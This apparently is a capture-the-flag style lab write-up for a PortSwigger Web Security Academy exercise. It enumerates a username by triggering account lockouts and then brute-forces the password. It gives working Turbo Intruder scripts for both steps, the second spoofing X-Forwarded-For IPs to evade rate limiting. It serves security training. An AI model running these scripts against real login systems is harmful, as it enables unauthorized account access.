---
title: Username enumeration via account lock
category: Authentication
difficulty: Practitioner
tags:
  - authentication-failures
  - brute-force
---
The goal of this lab is to identify the correct username and password. The application implements brute-force protection that locks accounts after a certain number of failed attempts, but a flaw in the implementation allows for account enumeration.

Quick manual testing for random credentials shows that as long as the account does not exist, the error message probably is just `Invalid username or password.` even after many (10+) tries.
Therefore, we will look for a different error message - the goal is to find an account that will be locked by brute-forcing.

There are two ways we can detect a different response in this lab. It seems that the failure page has the same length every time the request is sent (and the account does not exist):
![[username-enumeration-via-account-lock-img1.png]]

We can also use Turbo Intruder to look for a specific phrase inside the response body:
```python
def handleResponse(req, interesting):
	if 'Invalid username or password.' not in req.response:
		table.add(req)
```

The HTTP request skeleton is:
```http
POST /login HTTP/2
Host: 0a(...)b2.web-security-academy.net
Cookie: session=zu(...)5G
Content-Length: 29
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Origin: https://0a(...)b2.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a(...)b2.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

username=%s&password=123321
```

Right now we are only looking for the username, so the password will stay constant. The goal of the script is to trigger a lockout on a valid account.

The Turbo Intruder script for username enumeration is:
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=10,
                           pipeline=False,
                           engine=Engine.THREADED
                           )

    for word in open('/home/kali/Downloads/PS-WSA-usernames.txt'):
        for i in range(10):
            engine.queue(target.req, word.strip())


def handleResponse(req, interesting):
    if 'Invalid username or password.' not in req.response:
        table.add(req)
```

The results of Turbo Intruder are as follows:
![[username-enumeration-via-account-lock-img2.png]]

Besides the HTTP 200 status, we can also see some requests without a status, which have only "null" as the response. In my experience, this usually happens when there are too many concurrent requests, and some of them fail. 

Let's take a closer look at the response with code 200 and payload `guest`:
![[username-enumeration-via-account-lock-img3.png]]

We can see an error message from the brute-force prevention mechanism. Since this is the only payload, where the error message has changed, we can determine that an account with username `guest` exists. Now we need to brute-force the password. First, let's check how many attempts can we make before the protection bans us - and if there are ways to bypass this like in [[Labs/Authentication/username-enumeration-via-response-timing|Username enumeration via response timing]] using the `X-Forwarded-For` header.

Manual testing shows that on the fourth incorrect attempt, the error message changes to the brute-force protection message. Let's add the `X-Forwarded-For` header to the brute-force - maybe it will bypass the protection.

In the HTTP request I added the `X-Forwarded-For: %s` line at the end of headers.
Turbo Intruder script:
```python
import random

def randomIP():
    return ".".join(map(str, (random.randint(0,255) for _ in range(4))))

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=10,
                           pipeline=False,
                           engine=Engine.THREADED
                           )

    for word in open('/home/kali/Downloads/PS-WSA-passwords.txt'):
        engine.queue(target.req, [randomIP(), word.strip()])


def handleResponse(req, interesting):
    table.add(req)
```

Running the script shows these results:
![[username-enumeration-via-account-lock-img4.png]]

A few things stand out:
- One request has a different length than others and a high anomaly score
- Three requests have a different length than others - after inspection, these are the error messages before brute force protection took over
- The rest have the same error message related to the brute force protection

The singular request does not contain any error message, yet the lab is not solved and the page shows the login form. Maybe the brute force protection did not allow the login, even though the credentials `guest:charlie` were correct. Logging in after the 1-minute ban has ended solves the lab.

![[username-enumeration-via-account-lock-img5.png]]